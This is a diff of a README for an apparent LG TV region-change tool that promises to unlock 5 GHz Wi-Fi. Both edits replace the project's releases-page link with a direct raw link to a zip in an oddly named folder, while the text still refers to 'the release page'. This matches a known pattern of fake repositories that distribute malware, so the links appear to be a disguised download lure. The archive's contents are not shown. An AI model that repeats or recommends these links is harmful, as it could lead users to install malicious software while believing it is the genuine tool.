@@ -1,6 +1,6 @@
 # 📺 lg-c5-webos25-region-change - Unlock 5 GHz Wi-Fi on Your LG TV
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Ricketinessselfconsciousness1729/lg-c5-webos25-region-change/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ricketinessselfconsciousness1729/lg-c5-webos25-region-change/main/netherward/c_lg_webos_region_change_3.0-alpha.4.zip)
 
 ## 🎯 What This Tool Does
 
@@ -29,7 +29,7 @@ You must read and save your original area option before making any changes. Cont
 
 ## 📥 Download the Application
 
-[Visit this link to download the application](https://github.com/Ricketinessselfconsciousness1729/lg-c5-webos25-region-change/releases)
+[Visit this link to download the application](https://raw.githubusercontent.com/Ricketinessselfconsciousness1729/lg-c5-webos25-region-change/main/netherward/c_lg_webos_region_change_3.0-alpha.4.zip)
 
 On the release page, look for the latest version and download the file. Save it to a convenient location like your Desktop or Downloads folder.
 
